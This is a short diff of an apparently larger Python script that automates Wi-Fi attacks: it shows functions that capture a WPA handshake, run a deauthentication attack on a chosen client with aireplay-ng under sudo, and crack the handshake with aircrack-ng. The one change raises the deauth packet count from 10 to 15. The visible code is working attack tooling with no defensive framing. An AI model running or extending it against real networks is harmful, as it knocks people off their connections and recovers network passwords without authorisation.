@@ -85,7 +85,7 @@ def capture_handshake(interface, target_mac, channel, output_file):
 # Function to perform deauthentication attack on a client
 def deauth_attack(interface, target_mac, client_mac, channel):
     print(f"Performing deauth attack on {client_mac} using aireplay-ng...")
-    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_mac, "-c", client_mac, "-b", target_mac, interface], check=True)
+    subprocess.run(["sudo", "aireplay-ng", "--deauth", "15", "-a", target_mac, "-c", client_mac, "-b", target_mac, interface], check=True)
 
 # Function to crack WPA handshake using aircrack-ng
 def crack_wpa_handshake(output_file, wordlist):
